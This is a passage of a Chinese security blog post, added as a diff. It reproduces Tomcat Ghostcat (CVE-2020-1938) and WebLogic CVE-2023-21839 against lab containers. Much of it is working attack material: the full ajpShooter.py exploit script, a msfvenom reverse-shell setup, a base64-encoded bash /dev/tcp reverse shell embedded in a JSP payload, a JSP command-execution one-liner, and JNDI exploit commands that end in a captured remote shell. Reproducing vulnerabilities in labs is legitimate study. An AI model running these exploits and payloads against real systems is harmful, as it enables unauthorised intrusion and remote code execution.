+parser.add_argument("target", type=str, help="Hostname or IP to attack")
+parser.add_argument('-p', '--port', type=int, default=8009, help="AJP port to attack (default is 8009)")
+parser.add_argument("-f", '--file', type=str, default='WEB-INF/web.xml', help="file path :(WEB-INF/web.xml)")
+args = parser.parse_args()
+t = Tomcat(args.target, args.port)
+_,data = t.perform_request('/asdf',attributes=[
+    {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},
+    {'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]},
+    {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},
+    ])
+print('----------------------------')
+print("".join([d.data for d in data]))
+                                         </details>
+
+
+
+<pre><code>python2 poc.py -p 8009 -f /WEB-INF/web.xml 127.0.0.1
+</code></pre>
+<p>一个有意思的扩展：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/12870365.html">CVE-2020-1938 ：Apache Tomcat AJP 漏洞复现和分析 - 渗透测试中心 - 博客园</a></p>
+<p>一个简单点的getshell：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_67844671/article/details/132829494">【网络安全—漏洞复现】Tomcat CVE-2020-1938 漏洞复现和利用过程（特详细）-CSDN博客</a></p>
+<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.31.150 LPORT=8888 -f raw &gt; aini_shell.txt
+</code></pre>
+<pre><code>docker cp aini_shell.txt 525a39f3a85e:/usr/local/tomcat/webapps/ROOT/WEB-INF/
+</code></pre>
+<pre><code>use exploit/multi/handler
+set payload java/jsp_shell_reverse_tcp
+set lhost 192.168.31.150 ## 攻击器IP
+set lport 4444  ## 攻击器需要监听的端口（跟生成反向shell时设置的端口一样）
+</code></pre>
+<pre><code>python2 &#39;Tomcat-ROOT路径下文件包含(CVE-2020-1938).py&#39; -p 8009 -f /WEB-INF/aini_shell.txt 192.168.31.160
+</code></pre>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMTAuNC85MDAxIDA+JjE= 
+//bash -i &gt;&amp; /dev/tcp/172.20.10.4/9001 0&gt;&amp;1
+</code></pre>
+<p>payload:shell.txt</p>
+<pre><code>&lt;%Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMTAuNC85MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);%&gt;
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py">Ghostcat-CNVD-2020-10487&#x2F;ajpShooter.py at master · 00theway&#x2F;Ghostcat-CNVD-2020-10487</a></p>
+<details>
+    <summary>POC_shooter.py</summary>
+```
+#!/usr/bin/python3
+# Author: 00theway
+import socket
+import binascii
+import argparse
+import urllib.parse
+debug = False
+def log(type, *args, **kwargs):
+    if type == 'debug' and debug == False:
+        return
+    elif type == 'append' and debug == True:
+        return
+    elif type == 'append':
+        kwargs['end'] = ''
+        print(*args, **kwargs)
+        return
+    print('[%s]' % type.upper(), *args, **kwargs)
+class ajpRequest(object):
+    def __init__(self, request_url, method='GET', headers=[], attributes=[]):
+        self.request_url = request_url
+        self.method = method
+        self.headers = headers
+        self.attributes = attributes
+    def method2code(self, method):
+        methods = {
+            'OPTIONS': 1,
+            'GET': 2,
+            'HEAD': 3,
+            'POST': 4,
+            'PUT': 5,
+            'DELETE': 6,
+            'TRACE': 7,
+            'PROPFIND': 8
+        }
+        code = methods.get(method, 2)
+        return code
+    def make_headers(self):
+        header2code = {
+            b'accept': b'\xA0\x01',  # SC_REQ_ACCEPT
+            b'accept-charset': b'\xA0\x02',  # SC_REQ_ACCEPT_CHARSET
+            b'accept-encoding': b'\xA0\x03',  # SC_REQ_ACCEPT_ENCODING
+            b'accept-language': b'\xA0\x04',  # SC_REQ_ACCEPT_LANGUAGE
+            b'authorization': b'\xA0\x05',  # SC_REQ_AUTHORIZATION
+            b'connection': b'\xA0\x06',  # SC_REQ_CONNECTION
+            b'content-type': b'\xA0\x07',  # SC_REQ_CONTENT_TYPE
+            b'content-length': b'\xA0\x08',  # SC_REQ_CONTENT_LENGTH
+            b'cookie': b'\xA0\x09',  # SC_REQ_COOKIE
+            b'cookie2': b'\xA0\x0A',  # SC_REQ_COOKIE2
+            b'host': b'\xA0\x0B',  # SC_REQ_HOST
+            b'pragma': b'\xA0\x0C',  # SC_REQ_PRAGMA
+            b'referer': b'\xA0\x0D',  # SC_REQ_REFERER
+            b'user-agent': b'\xA0\x0E'  # SC_REQ_USER_AGENT
+        }
+        headers_ajp = []
+        for (header_name, header_value) in self.headers:
+            code = header2code.get(header_name, b'')
+            if code != b'':
+                headers_ajp.append(code)
+                headers_ajp.append(self.ajp_string(header_value))
+            else:
+                headers_ajp.append(self.ajp_string(header_name))
+                headers_ajp.append(self.ajp_string(header_value))
+        return self.int2byte(len(self.headers), 2), b''.join(headers_ajp)
+    def make_attributes(self):
+        '''
+        org.apache.catalina.jsp_file
+        javax.servlet.include.servlet_path + javax.servlet.include.path_info
+        '''
+        attribute2code = {
+            b'remote_user': b'\x03',
+            b'auth_type': b'\x04',
+            b'query_string': b'\x05',
+            b'jvm_route': b'\x06',
+            b'ssl_cert': b'\x07',
+            b'ssl_cipher': b'\x08',
+            b'ssl_session': b'\x09',
+            b'req_attribute': b'\x0A',  # Name (the name of the attribut follows)
+            b'ssl_key_size': b'\x0B'
+        }
+        attributes_ajp = []
+        for (name, value) in self.attributes:
+            code = attribute2code.get(name, b'')
+            if code != b'':
+                attributes_ajp.append(code)
+                if code == b'\x0A':
+                    for v in value:
+                        attributes_ajp.append(self.ajp_string(v))
+                else:
+                    attributes_ajp.append(self.ajp_string(value))
+        return b''.join(attributes_ajp)
+    def ajp_string(self, message_bytes):
+        # an AJP string
+        # the length of the string on two bytes + string + plus two null bytes
+        message_len_int = len(message_bytes)
+        return self.int2byte(message_len_int, 2) + message_bytes + b'\x00'
+    def int2byte(self, data, byte_len=1):
+        return data.to_bytes(byte_len, 'big')
+    def make_forward_request_package(self):
+        '''
+        AJP13_FORWARD_REQUEST :=
+            prefix_code      (byte) 0x02 = JK_AJP13_FORWARD_REQUEST
+            method           (byte)
+            protocol         (string)
+            req_uri          (string)
+            remote_addr      (string)
+            remote_host      (string)
+            server_name      (string)
+            server_port      (integer)
+            is_ssl           (boolean)
+            num_headers      (integer)
+            request_headers *(req_header_name req_header_value)
+            attributes      *(attribut_name attribute_value)
+            request_terminator (byte) OxFF
+        '''
+        req_ob = urllib.parse.urlparse(self.request_url)
+        # JK_AJP13_FORWARD_REQUEST
+        prefix_code_int = 2
+        prefix_code_bytes = self.int2byte(prefix_code_int)
+        method_bytes = self.int2byte(self.method2code(self.method))
+        protocol_bytes = b'HTTP/1.1'
+        req_uri_bytes = req_ob.path.encode('utf8')
+        remote_addr_bytes = b'127.0.0.1'
+        remote_host_bytes = b'localhost'
+        server_name_bytes = req_ob.hostname.encode('utf8')
+        # SSL flag
+        if req_ob.scheme == 'https':
+            is_ssl_boolean = 1
+        else:
+            is_ssl_boolean = 0
+        # port
+        server_port_int = req_ob.port
+        if not server_port_int:
+            server_port_int = (is_ssl_boolean ^ 1) * 80 + (is_ssl_boolean ^ 0) * 443
+        server_port_bytes = self.int2byte(server_port_int, 2)  # convert to a two bytes
+        is_ssl_bytes = self.int2byte(is_ssl_boolean)  # convert to a one byte
+        self.headers.append((b'host', b'%s:%d' % (server_name_bytes, server_port_int)))
+        num_headers_bytes, headers_ajp_bytes = self.make_headers()
+        attributes_ajp_bytes = self.make_attributes()
+        message = []
+        message.append(prefix_code_bytes)
+        message.append(method_bytes)
+        message.append(self.ajp_string(protocol_bytes))
+        message.append(self.ajp_string(req_uri_bytes))
+        message.append(self.ajp_string(remote_addr_bytes))
+        message.append(self.ajp_string(remote_host_bytes))
+        message.append(self.ajp_string(server_name_bytes))
+        message.append(server_port_bytes)
+        message.append(is_ssl_bytes)
+        message.append(num_headers_bytes)
+        message.append(headers_ajp_bytes)
+        message.append(attributes_ajp_bytes)
+        message.append(b'\xff')
+        message_bytes = b''.join(message)
+        send_bytes = b'\x12\x34' + self.ajp_string(message_bytes)
+        return send_bytes
+class ajpResponse(object):
+    def __init__(self, s, out_file):
+        self.sock = s
+        self.out_file = out_file
+        self.body_start = False
+        self.common_response_headers = {
+            b'\x01': b'Content-Type',
+            b'\x02': b'Content-Language',
+            b'\x03': b'Content-Length',
+            b'\x04': b'Date',
+            b'\x05': b'Last-Modified',
+            b'\x06': b'Location',
+            b'\x07': b'Set-Cookie',
+            b'\x08': b'Set-Cookie2',
+            b'\x09': b'Servlet-Engine',
+            b'\x0a': b'Status',
+            b'\x0b': b'WWW-Authenticate',
+        }
+        if not self.out_file:
+            self.out_file = False
+        else:
+            log('*', 'store response in %s' % self.out_file)
+            self.out = open(self.out_file, 'wb')
+    def parse_response(self):
+        log('debug', 'start')
+        magic = self.recv(2)  # first two bytes are the 'magic'
+        log('debug', 'magic', magic, binascii.b2a_hex(magic))
+        # next two bytes are the length
+        data_len_int = self.read_int(2)
+        code_int = self.read_int(1)
+        log('debug', 'code', code_int)
+        if code_int == 3:
+            self.parse_send_body_chunk()
+        elif code_int == 4:
+            self.parse_headers()
+        elif code_int == 5:
+            self.parse_response_end()
+            quit()
+        self.parse_response()
+    def parse_headers(self):
+        log("append", '\n')
+        log('debug', 'parsing RESPONSE HEADERS')
+        status_int = self.read_int(2)
+        msg_bytes = self.read_string()
+        log('<', status_int, msg_bytes.decode('utf8'))
+        headers_number_int = self.read_int(2)
+        log('debug', 'headers_nb', headers_number_int)
+        for i in range(headers_number_int):
+            # header name: two cases
+            first_byte = self.recv(1)
+            second_byte = self.recv(1)
+            if first_byte == b'\xa0':
+                header_key_bytes = self.common_response_headers[second_byte]
+            else:
+                header_len_bytes = first_byte + second_byte
+                header_len_int = int.from_bytes(header_len_bytes, byteorder='big')
+                header_key_bytes = self.read_bytes(header_len_int)
+                # consume the 0x00 terminator
+                self.recv(1)
+            header_value_bytes = self.read_string()
+            try:
+                header_key_bytes = header_key_bytes.decode('utf8')
+                header_value_bytes = header_value_bytes.decode('utf8')
+            except:
+                pass
+            log('<', '%s: %s' % (header_key_bytes, header_value_bytes))
+    def parse_send_body_chunk(self):
+        if not self.body_start:
+            log('append', '\n')
+            log('debug', 'start parsing body chunk')
+            self.body_start = True
+        chunk = self.read_string()
+        if self.out_file:
+            self.out.write(chunk)
+        else:
+            try:
+                chunk = chunk.decode('utf8')
+            except:
+                pass
+            log('append', chunk)
+    def parse_response_end(self):
+        log('debug', 'start parsing end')
+        code_reuse_int = self.read_int(1)
+        log('debug', "finish parsing end", code_reuse_int)
+        self.sock.close()
+    def read_int(self, int_len):
+        return int.from_bytes(self.recv(int_len), byteorder='big')
+    def read_bytes(self, bytes_len):
+        return self.recv(bytes_len)
+    def read_string(self, int_len=2):
+        data_len = self.read_int(int_len)
+        data = self.recv(data_len)
+        # consume the 0x00 terminator
+        end = self.recv(1)
+        log('debug', 'read_string read data_len:%d\ndata_len:%d\nend:%s' % (data_len, len(data), end))
+        return data
+    def recv(self, data_len):
+        data = self.sock.recv(data_len)
+        while len(data) < data_len:
+            log('debug', 'recv not end,wait for %d bytes' % (data_len - len(data)))
+            data += self.sock.recv(data_len - len(data))
+        return data
+class ajpShooter(object):
+    def __init__(self, args):
+        self.args = args
+        self.headers = args.header
+        self.ajp_port = args.ajp_port
+        self.requesturl = args.url
+        self.target_file = args.target_file
+        self.shooter = args.shooter
+        self.method = args.X
+        self.out_file = args.out_file
+    def shoot(self):
+        headers = self.transform_headers()
+        target_file = self.target_file.encode('utf8')
+        attributes = []
+        evil_req_attributes = [
+            (b'javax.servlet.include.request_uri', b'index'),
+            (b'javax.servlet.include.servlet_path', target_file)
+        ]
+        for req_attr in evil_req_attributes:
+            attributes.append((b"req_attribute", req_attr))
+        if self.shooter == 'read':
+            self.requesturl += '/index.txt'
+        else:
+            self.requesturl += '/index.jsp'
+        ajp_ip = urllib.parse.urlparse(self.requesturl).hostname
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ajp_ip, self.ajp_port))
+        message = ajpRequest(self.requesturl, self.method, headers, attributes).make_forward_request_package()
+        s.send(message)
+        ajpResponse(s, self.out_file).parse_response()
+    def transform_headers(self):
+        self.headers = [] if not self.headers else self.headers
+        newheaders = []
+        for header in self.headers:
+            hsplit = header.split(':')
+            hname = hsplit[0]
+            hvalue = ':'.join(hsplit[1:])
+            newheaders.append((hname.lower().encode('utf8'), hvalue.encode('utf8')))
+        return newheaders
+if __name__ == "__main__":
+    # parse command line arguments
+    print('''
+       _    _         __ _                 _            
+      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
+     //_\\\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
+    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
+    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
+         |__/|_|                                        
+                                                00theway,just for test
+    ''')
+    parser = argparse.ArgumentParser()
+    parser.add_argument('url', help='target site\'s context root url like http://www.example.com/demo/')
+    parser.add_argument('ajp_port', default=8009, type=int, help='ajp port')
+    parser.add_argument('target_file', help='target file to read or eval like /WEB-INF/web.xml,/image/evil.jpg')
+    parser.add_argument('shooter', choices=['read', 'eval'], help='read or eval file')
+    parser.add_argument('--ajp-ip', help='ajp server ip,default value will parse from from url')
+    parser.add_argument('-H', '--header', help='add a header', action='append')
+    parser.add_argument('-X', help='Sets the method (default: %(default)s).', default='GET',
+                        choices=['GET', 'POST', 'HEAD', 'OPTIONS', 'PROPFIND'])
+    parser.add_argument('-d', '--data', nargs=1, help='The data to POST')
+    parser.add_argument('-o', '--out-file', help='write response to file')
+    parser.add_argument('--debug', action='store_true', default=False)
+    args = parser.parse_args()
+    debug = args.debug
+    ajpShooter(args).shoot()
+                                   ```
+                                   </details>
+
+
+
+<blockquote>
+<p>&#x2F;&#x2F; 去除代码空行</p>
+<p>在 Kali Linux 中，你可以使用以下几种方法来去除脚本中的空行：</p>
+<h3 id="方法-1：使用-sed"><a href="#方法-1：使用-sed" class="headerlink" title="方法 1：使用 sed"></a>方法 1：使用 <code>sed</code></h3><pre><code>bash
+
+
+复制代码
+sed &#39;/^$/d&#39; your_script.sh &gt; output_script.sh
+</code></pre>
+<ul>
+<li>这条命令会删除空行并将结果输出到 <code>output_script.sh</code> 文件中。</li>
+</ul>
+<h3 id="方法-2：使用-grep"><a href="#方法-2：使用-grep" class="headerlink" title="方法 2：使用 grep"></a>方法 2：使用 <code>grep</code></h3><pre><code>bash
+复制代码
+grep -v &#39;^$&#39; your_script.sh &gt; output_script.sh
+</code></pre>
+<ul>
+<li><code>grep -v &#39;^$&#39;</code> 会过滤掉所有空行，将非空行保存到 <code>output_script.sh</code>。</li>
+</ul>
+<h3 id="方法-3：使用-awk"><a href="#方法-3：使用-awk" class="headerlink" title="方法 3：使用 awk"></a>方法 3：使用 <code>awk</code></h3><pre><code>bash
+
+
+复制代码
+awk &#39;NF&#39; your_script.sh &gt; output_script.sh
+</code></pre>
+<ul>
+<li>这条命令会只保留包含内容的行（非空行），并输出到新的文件。</li>
+</ul>
+</blockquote>
+<p>也可以上传一句话命令执行文件exec.txt(里面的系统命令可以根据需要修改）</p>
+<p>exec.txt内容如下：</p>
+<pre><code>&lt;%out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream())).readLine());%&gt;
+</code></pre>
+<p>后续再跟进一下触发过程和代码，相当于学习代码审计了。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/12870365.html">CVE-2020-1938 ：Apache Tomcat AJP 漏洞复现和分析 - 渗透测试中心 - 博客园</a></p>
+<h2 id="Tomcat8-（war）"><a href="#Tomcat8-（war）" class="headerlink" title="Tomcat8 （war）"></a>Tomcat8 （war）</h2><p>这个应该是很老的一个漏洞，需要管理员账户。</p>
+<p>只是需要注意文件上传成功后，默认会在网站根目录下生成和war包名称一致的目录，我的压缩文件名为<code>shell.jsp.war</code>,则要到<code>/shell.jsp</code>目录下访问<code>shell.jsp</code></p>
+<pre><code>http://127.0.0.1:8080/shell.jsp/shell.jsp
+</code></pre>
+<h1 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1><h2 id="CVE-2023-21839"><a href="#CVE-2023-21839" class="headerlink" title="CVE-2023-21839"></a>CVE-2023-21839</h2><p>CVE-2023-21839 允许远程用户在未经授权的情况下通过 IIOP&#x2F;T3 进行 JNDI lookup 操作，当 JDK 版本过低或本地存在小工具（javaSerializedData）时，这可能会导致 RCE 漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/BlogVice-2203/p/17454727.html">Weblogic反序列化（CVE-2023-21839）漏洞复现 - Vice_2203 - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/364212.html">Weblogic CVE 2023-21839漏洞复现 - FreeBuf网络安全行业门户</a></p>
+<p>如果不适用工具包的话环境还比较麻烦，这里使用工具复现一下：</p>
+<p>首先要启动一个ldap服务器：</p>
+<p>tool：JNDI利用工具</p>
+<pre><code>E:\BaiduNetdiskDownload\ONE-FOX集成工具箱_V6公开版_by狐狸\gui_scan\jndi&gt;java -jar JNDIExploit-2.0-SNAPSHOT.jar
+Error: The following option is required: [-i | --ip]
+
+Usage: java -jar  MYJNDIExploit1.1.jar [options]
+  Options:
+  * -i, --ip       Local ip address
+    -l, --ldapPort Ldap bind port (default: 1389)
+    -p, --httpPort Http bind port (default: 8080)
+    -u, --usage    Show usage (default: false)
+    -h, --help     Show this help
+    -o, --output   out put file
+
+
+E:\BaiduNetdiskDownload\ONE-FOX集成工具箱_V6公开版_by狐狸\gui_scan\jndi&gt;java -jar JNDIExploit-2.0-SNAPSHOT.jar -i 192.168.1.105
+[+] LDAP Server Start Listening on 1389...
+[+] HTTP Server Start Listening on 8080...
+</code></pre>
+<p>启动监听：</p>
+<pre><code>//kali  : 192.168.1.102
+nc -lvnp 9001
+</code></pre>
+<blockquote>
+<p>此时使用攻击机B执行exp</p>
+<p>java -jar Weblogic-CVE-2023-21839.jar 靶场 IP:7001 ldap:&#x2F;&#x2F;ldap服务器IP:1389&#x2F;Basic&#x2F;ReverseShell&#x2F;ldap服务器IP&#x2F;nc监听端口</p>
+</blockquote>
+<pre><code># java -jar Weblogic-CVE-2023-21839.jar 127.0.0.1:7001 ldap://192.168.1.102:1389/Basic/ReverseShell/192.168.1.102/9001
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+</code></pre>
+<blockquote>
+<p>切换Java：<a target="_blank" rel="noopener" href="https://blog.csdn.net/huayimy/article/details/130273362">Kali安装JAVA8和切换JDK版本的详细过程_kali安装jdk8-CSDN博客</a></p>
+<p>这里有个逆天的地方：</p>
+<p>Java 1.8 不支持 <code>--version</code> 选项。相反，可以使用 <code>java -version</code> 来查看安装的 Java 版本</p>
+</blockquote>
+<p>但是卡住了：</p>
+<pre><code>─# java -jar JNDIExploit-2.0-SNAPSHOT.jar -i 127.0.0.1 -p 3322
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+[+] LDAP Server Start Listening on 1389...
+[+] HTTP Server Start Listening on 3322...
+[+] Received LDAP Query: Basic/ReverseShell/192.168.1.102/9001
+[+] Payload: reverseshell
+[+] IP: 192.168.1.102
+[+] Port: 9001
+[+] Sending LDAP ResourceRef result for Basic/ReverseShell/192.168.1.102/9001 with basic remote reference payload
+[+] Send LDAP reference result for Basic/ReverseShell/192.168.1.102/9001 redirecting to http://127.0.0.1:3322/Exploitp7e3ex3jCE.class
+</code></pre>
+<p>找了很久，发现是<code>jndi</code>服务器的ip不能填<code>0.0.0.0</code>或者<code>127.0.0.1</code></p>
+<pre><code>└─# nc -lvvp 9001
+listening on [any] 9001 ...
+172.21.0.2: inverse host lookup failed: Unknown host
+connect to [192.168.1.102] from (UNKNOWN) [172.21.0.2] 39840
+bash: no job control in this shell
+[oracle@304fd45a9ef2 base_domain]$ 
+</code></pre>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2024/10/28/HTB-CICADA/" title="HTB_CICADA"><span class="has-text-weight-semibold">Next: HTB_CICADA</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
